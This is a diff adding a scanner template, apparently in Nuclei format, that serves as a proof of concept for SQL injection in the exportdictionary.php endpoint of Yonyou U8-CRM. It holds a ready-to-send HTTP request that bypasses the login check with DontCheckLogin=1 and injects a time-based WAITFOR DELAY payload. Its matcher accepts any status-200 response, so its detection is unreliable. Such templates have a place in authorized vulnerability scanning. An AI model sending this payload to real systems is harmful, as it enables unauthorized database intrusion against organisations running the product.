@@ -1,0 +1,32 @@
+id: poc-lxgon3u44hvs85v8
+info:
+  name: 用友U8-CRM接口exportdictionary.php存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lxgon3u44hvs85v8'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lxgon3u44hvs85v8
+http:
+- raw:
+  - 'GET /devtools/tools/exportdictionary.php?DontCheckLogin=1&value=1%27;WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+
+    X-Requested-With: XMLHttpRequest
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: PHPSESSID=bgsesstimeout-; TL_EXPANDED=REL_STAGE2012'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
